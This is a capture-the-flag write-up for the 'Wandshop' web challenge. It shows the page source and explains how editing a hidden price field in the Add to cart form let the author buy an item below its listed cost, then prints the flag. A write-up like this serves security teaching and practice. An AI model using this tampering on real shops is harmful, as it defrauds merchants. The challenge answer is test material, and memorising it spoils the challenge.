---
layout: default
---

![Wandshop (100 pts)](./screenshots/Wandshop.png)
---
## CHALLENGE INFO
- __CHALLENGE LINK__: https://wandshop.tghack.no/
- __LANDING PAGE__:

  ![homepage](./screenshots/Wandshop_home.png)

- __ASSUMED OBJECTIVE__: Increase a wand's __*SKU*__ or decrease __*Elder Wand's cost*__

---

## Step 1 : Examine the Page Souce

- Page Source:
  ```html
  <html>
  <head>
      <title>OllyDbg Wands</title>
  </head>
  <body>


      <h1>Your credit: 1337 coins</h1>
      <h1>Shopping cart:</h1>
      <ul>
      
          <form action="/" method="post">
              <input type="hidden" name="csrfmiddlewaretoken" value="6s723TbsAI7SK6bkAhcJ4iA0GFG1f6RvW8J2pIwKvWplEGIm0OxdY3yqS5cId96m">
              <input type="hidden" name="action" value="reset"/>
              <button>Reset</button>
          </form>
      <form action="/" method="post">
          <input type="hidden" name="csrfmiddlewaretoken" value="6s723TbsAI7SK6bkAhcJ4iA0GFG1f6RvW8J2pIwKvWplEGIm0OxdY3yqS5cId96m">
          <input type="hidden" name="action" value="order"/>
          <button>Send order</button>
      </form>
      </ul>
      <h1>Items</h1>
      <div style="display: flex; flex-direction: row;">
            
              <div style="width: 10em; height: 10em; text-align: center; background-color: lightgray; margin: 0.5em;">
                  <strong>Horse-hair wand</strong><br/>
                  SKU: 1<br/>
                  Price: 123.00 coins
                  <form action="" method="post">
                      <input type="hidden" name="csrfmiddlewaretoken" value="6s723TbsAI7SK6bkAhcJ4iA0GFG1f6RvW8J2pIwKvWplEGIm0OxdY3yqS5cId96m">
                      <input type="hidden" name="action" value="add_cart"/>
                      <input type="hidden" name="sku" value="1"/>
                      <input type="hidden" name="price" value="123.00"/>
                      <button type="submit">Add to cart</button>
                  </form>
              </div>
           
              <div style="width: 10em; height: 10em; text-align: center; background-color: lightgray; margin: 0.5em;">
                  <strong>Dragon-bone wand</strong><br/>
                  SKU: 2<br/>
                  Price: 323.00 coins
                  <form action="" method="post">
                      <input type="hidden" name="csrfmiddlewaretoken" value="6s723TbsAI7SK6bkAhcJ4iA0GFG1f6RvW8J2pIwKvWplEGIm0OxdY3yqS5cId96m">
                      <input type="hidden" name="action" value="add_cart"/>
                      <input type="hidden" name="sku" value="2"/>
                      <input type="hidden" name="price" value="323.00"/>
                      <button type="submit">Add to cart</button>
                  </form>
              </div>
            
              <div style="width: 10em; height: 10em; text-align: center; background-color: lightgray; margin: 0.5em;">
                  <strong>Troll-snot wand</strong><br/>
                  SKU: 3<br/>
                  Price: 723.00 coins
                  <form action="" method="post">
                      <input type="hidden" name="csrfmiddlewaretoken" value="6s723TbsAI7SK6bkAhcJ4iA0GFG1f6RvW8J2pIwKvWplEGIm0OxdY3yqS5cId96m">
                      <input type="hidden" name="action" value="add_cart"/>
                      <input type="hidden" name="sku" value="3"/>
                      <input type="hidden" name="price" value="723.00"/>
                      <button type="submit">Add to cart</button>
                  </form>
              </div>
            
              <div style="width: 10em; height: 10em; text-align: center; background-color: lightgray; margin: 0.5em;">
                  <strong>Elder Wand</strong><br/>
                  SKU: 321<br/>
                  Price: 5000.00 coins
                  <form action="" method="post">
                      <input type="hidden" name="csrfmiddlewaretoken" value="6s723TbsAI7SK6bkAhcJ4iA0GFG1f6RvW8J2pIwKvWplEGIm0OxdY3yqS5cId96m">
                      <input type="hidden" name="action" value="add_cart"/>
                      <input type="hidden" name="sku" value="321"/>
                      <input type="hidden" name="price" value="5000.00"/>
                      <button type="submit">Add to cart</button>
                  </form>
              </div>
          
      </div>

  </body>
  </html>
  ```
  __Notes__:
  - You have 1337 coins as credits
  - Each wand's attriutes are passed as *hidden input* in individual forms
  - You __can__ change the wand's price but not your credits

---

## Step 2 : Purchase the Elder Wand

1. Change the __*Elder Wand's price*__ to at most __1337 coins__
   ```html
   <div style="width: 10em; height: 10em; text-align: center; background-color: lightgray; margin: 0.5em;">
       <strong>Elder Wand</strong><br/>
       SKU: 321<br/>
       Price: 5000.00 coins
       <form action="" method="post">
           <input type="hidden" name="csrfmiddlewaretoken" value="6s723TbsAI7SK6bkAhcJ4iA0GFG1f6RvW8J2pIwKvWplEGIm0OxdY3yqS5cId96m">
           <input type="hidden" name="action" value="add_cart"/>
           <input type="hidden" name="sku" value="321"/>
           <input type="hidden" name="price" value="1337.00"/>
           <button type="submit">Add to cart</button>
       </form>
   </div>
   ```
2. Press __Add to cart__
   
   ![Add to cart](./screenshots/Wandshop_cart.png)

3. Press __Send order__
   ```
   Yay! You ordered an Elder Wand. FLAG: TG19{Elder wand iz best wand}
   ```

---

## FLAG : __TG19{Elder wand iz best wand}__
